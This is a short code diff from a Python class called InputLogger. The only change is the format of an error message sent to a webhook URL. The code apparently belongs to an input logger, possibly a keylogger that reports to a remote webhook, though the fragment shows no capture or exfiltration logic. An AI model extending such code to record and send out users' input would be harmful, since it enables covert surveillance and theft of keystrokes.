@@ -38,4 +38,4 @@ class InputLogger:
                 self.current_logs = ""
                 os.remove(self.log_file)
         except Exception as e:
-            send_webhook(self.webhook_url, f"Error logging input: {e}")
+            send_webhook(self.webhook_url, f"```❌ Error logging input: {e}```")
